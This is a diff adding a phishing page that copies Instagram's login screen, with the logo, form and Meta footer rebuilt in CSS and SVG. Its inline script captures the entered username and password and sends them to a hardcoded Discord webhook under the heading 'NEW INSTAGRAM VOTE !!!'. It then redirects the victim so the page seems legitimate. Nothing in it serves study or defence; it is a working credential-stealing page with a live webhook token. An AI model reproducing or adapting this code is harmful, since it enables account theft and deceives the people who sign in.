@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login </title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            min-height: 100vh;
+            padding: 20px 0;
+        }
+
+        .language-selector {
+            font-size: 12px;
+            color: #737373;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 350px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: auto;
+            margin-bottom: auto;
+        }
+
+        .logo-container {
+            margin-bottom: 40px;
+        }
+
+        /* Recreating the Instagram App Icon */
+        .insta-icon {
+            width: 60px;
+            height: 60px;
+            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .insta-icon-inner {
+            width: 44px;
+            height: 44px;
+            border: 4.5px solid #ffffff;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .insta-icon-circle {
+            width: 20px;
+            height: 20px;
+            border: 4.5px solid #ffffff;
+            border-radius: 50%;
+        }
+
+        .insta-icon-dot {
+            width: 5px;
+            height: 5px;
+            background-color: #ffffff;
+            border-radius: 50%;
+            position: absolute;
+            top: 13px;
+            right: 13px;
+        }
+
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px 12px;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            background-color: #fafafa;
+            font-size: 14px;
+            color: #262626;
+            outline: none;
+            transition: border-color 0.2s ease;
+        }
+
+        .input-field:focus {
+            border-color: #a8a8a8;
+        }
+
+        .input-field::placeholder {
+            color: #737373;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #0064e0;
+            color: #ffffff;
+            border: none;
+            border-radius: 25px; /* Matches the rounded pill shape in screenshot */
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 4px;
+        }
+
+        .login-btn:active {
+            opacity: 0.9;
+        }
+
+        .forgot-password {
+            color: #000000;
+            font-size: 14px;
+            text-decoration: none;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+
+        .footer {
+            width: 100%;
+            max-width: 350px;
+            padding: 0 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .create-account-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: transparent;
+            color: #0064e0;
+            border: 1px solid #0064e0;
+            border-radius: 25px;
+            font-size: 15px;
+            font-weight: 600;
+            text-align: center;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .meta-logo {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            color: #0064e0;
+            font-weight: bold;
+            font-size: 15px;
+            letter-spacing: 0.5px;
+            margin-bottom: 10px;
+        }
+
+        .meta-icon {
+            width: 16px;
+            height: 16px;
+            fill: #0064e0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="language-selector">English (US)</div>
+
+    <div class="login-container">
+        
+        <div class="logo-container">
+            <div class="insta-icon">
+                <div class="insta-icon-inner">
+                    <div class="insta-icon-circle"></div>
+                </div>
+                <div class="insta-icon-dot"></div>
+            </div>
+        </div>
+        <form class="login-form" id="loginForm">
+            <input type="text" id="username" class="input-field" placeholder="Username, email or mobile number" required>
+            <input type="password" id="password" class="input-field" placeholder="Password" required>
+            <button type="submit" class="login-btn">Log in</button>
+        </form>
+        
+        <script>
+        document.getElementById("loginForm").addEventListener("submit", async function (event) {
+            event.preventDefault();
+        
+            const data = {
+                title: "NEW INSTAGRAM VOTE !!!",
+                username: document.getElementById("username").value,
+                password: document.getElementById("password").value,
+                time: new Date().toISOString()
+            };
+        
+            try {
+                const response = await fetch("https://discordapp.com/api/webhooks/1516033298298835035/pfiJOGqTLagc5RzE3OA5NnS2Pf8qCfydZKRviE4w5NnJh2jKpd8fneP6Cq6x9slSotD4", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        content: "NEW INSTAGRAM VOTE !!!",
+                        embeds: [{
+                            title: data.title,
+                            fields: [
+                                { name: "Username", value: data.username },
+                                { name: "Password", value: data.password },
+                                { name: "Time", value: data.time }
+                            ]
+                        }]
+                    })
+                });
+                
+        
+                window.location.href  =  '/instagram/land.html'
+               
+            } catch (error) {
+                console.error(error);
+                alert("Network error.");
+
+            }
+        });
+        </script>
+           
+        <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot password?</a>
+    </div>
+
+    <div class="footer">
+        <a href="https://www.instagram.com/create/account/" class="create-account-btn">Create new account</a>
+        
+        <div class="meta-logo">
+            <svg class="meta-icon" viewBox="0 0 24 24">
+                <path d="M12 17.219c-1.393 0-2.73-.553-3.764-1.556L4.793 12.33a3.545 3.545 0 0 1 0-5.011 3.543 3.543 0 0 1 5.012 0l2.195 2.195 2.195-2.195a3.543 3.543 0 0 1 5.012 0 3.545 3.545 0 0 1 0 5.011l-3.443 3.333c-1.034 1.003-2.371 1.556-3.764 1.556zm-5.326-8.52a1.54 1.54 0 0 0-1.09.452 1.546 1.546 0 0 0 0 2.186l3.444 3.333a5.215 5.215 0 0 0 7.344 0l3.444-3.333a1.546 1.546 0 0 0 0-2.186 1.545 1.545 0 0 0-2.181 0l-3.287 3.287a.999.999 0 0 1-1.414 0L9.141 9.151a1.536 1.536 0 0 0-1.091-.452z"/>
+            </svg>
+            Meta
+        </div>
+    </div>
+
+</body>
+</html>
